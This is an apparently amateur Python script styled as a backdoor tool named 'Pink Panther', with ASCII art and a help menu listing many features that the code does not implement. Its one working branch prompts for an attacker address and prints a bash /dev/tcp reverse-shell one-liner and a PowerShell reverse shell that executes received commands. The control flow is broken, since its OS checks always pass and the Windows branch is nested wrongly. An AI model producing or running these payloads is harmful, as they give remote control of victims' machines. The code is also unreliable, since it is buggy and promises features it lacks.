import time
import colorama
from colorama import Fore
from colorama import *

time.sleep(0)
print(Fore.RED + """\ 
 (~~~~~~~~~~~~~~~)           (~~~~~~~~~~~~~~~)
     \   \~~~~~~~/ /             \   \~~~~~~~/ /
       \  \    / /                 \  \    / /
         \  \/ /__===_____________==_\  \/ /
        __ --  __----__          __-----__  --__
     _-~     /'         ~\      /'         ~\    ~-_
   /~       |____________|    |_____________|       ~\|
  |         |  O         |  /\| O           |         |
  |          \ _       ./ /    \.          /          |
  |             ~~~~~~ /        \~~~~~~~'           |
   \                  /____________\                 /
    ~--__         ___(              )___       ___--~
         ~~~~--~~~    \            /    ~~~--~~____------
 ------____/__   ~~     \        /    __---~~ ~\/
          |   ~~~~~       \    /        __----~|~~~~~~
      -----\------------    \/      _________  /
            \                |                /
              \   _______   / \     ~~----__/____
____-----~~~~~~~\~        /     \         /      ~~~~~---
                 ~-____-~        ~-____-~
                     \              /
                       \          /
                        ~-______-~          Pink Panther 
                                               By SDcat404 

                        """)

time.sleep(0)

print ("""\ 
Welcome to Pink Panther.

USAGE: 

  Command              Description
		  -------              -----------
		  help         [+]     Print this message.
		  connect      [+]     Connect with a sibling server.
		  generate     [+]     Generate backdoor payload.
		  siblings             Print sibling servers data table.
		  sessions             Print established backdoor sessions data table.
		  backdoors            Print established backdoor types data table.
		  sockets              Print Villain related running services' info.
		  shell        [+]     Enable an interactive pseudo-shell for a session.
		  exec         [+]     Execute command/file against a session.
		  upload       [+]     Upload files to a backdoor session.
		  alias        [+]     Set an alias for a shell session.
		  reset        [+]     Reset alias back to the session's unique ID.
          kill         [+]     Terminate an established backdoor session.
		  conptyshell  [+]     Slap Invoke-ConPtyShell against a backdoor session.
		  repair       [+]     Manually correct a session's hostname/username info.
		  id                   Print server's unique ID (Self).
		  cmdinspector [+]     Turn Session Defender on/off.
		  threasheds              Print information regarding active threads.
		  clear                Clear screen.
		  exit                 Kill all sessions and quit.



""")

print ("Type command")
shell = input()

if shell == 'shell':
    print("Enter LHOST: ")
    lhost = input()
    print("Choose OS")
    os = input()
    if os == 'linux' or 'Linux':
        print ("/bin/sh -i >& /dev/tcp/" + lhost + "/9999 0>&1")
     
        if os == 'windows' or 'Windows':
            print ("""\
                powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',99);$stream = $client.GetStream();[byte[]]$bytes = 0..65535
                |%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes
                ,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).
                GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""")
        

    time.sleep(2)
